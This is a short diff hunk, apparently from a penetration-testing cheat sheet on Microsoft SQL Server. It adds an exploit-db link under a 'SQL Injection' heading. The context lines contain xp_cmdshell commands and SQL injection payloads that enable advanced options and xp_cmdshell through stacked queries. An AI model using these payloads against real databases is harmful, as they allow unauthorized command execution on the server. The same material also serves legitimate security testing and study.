@@ -385,6 +385,7 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 
 # SQL Injection
+https://www.exploit-db.com/papers/12975
 ';EXEC sp_configure 'show advanced options', 1;--
 ';RECONFIGURE;--
 ';EXEC sp_configure "xp_cmdshell", 1;--
